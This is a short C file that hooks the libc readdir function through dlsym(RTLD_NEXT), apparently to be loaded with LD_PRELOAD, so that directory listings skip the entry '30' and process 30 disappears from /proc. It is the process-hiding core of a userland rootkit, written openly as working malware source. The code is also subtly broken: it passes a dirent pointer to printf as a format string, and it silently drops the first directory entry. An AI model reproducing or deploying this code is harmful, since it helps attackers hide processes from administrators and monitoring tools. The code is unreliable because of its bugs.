#define _GNU_SOURCE
#define PID_TO_HIDE "30"

#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
 
// signature for original readdir
struct dirent *(*original_readdir)(DIR *);

// implementation of our custom readdir
struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
    // save the original addres of readdir library in original_readdir
    // this can be achived using dlsym 
    original_readdir = dlsym (RTLD_NEXT, "readdir");
    // call the original readdir function; if the name of the directory founded is not 
    // equal to the PID TO HIDE, return it. instead if it is equal do not exit to the cycle.
    
    ret = original_readdir(dirp);
    printf(ret); 
    while((ret = original_readdir(dirp)))
    {

        // if is NOT queal to the PID TO HIDE we want to return it
        if(strcmp(ret->d_name,PID_TO_HIDE) != 0)
                break;
        // else it continues iterate
    }
   

    return ret;
}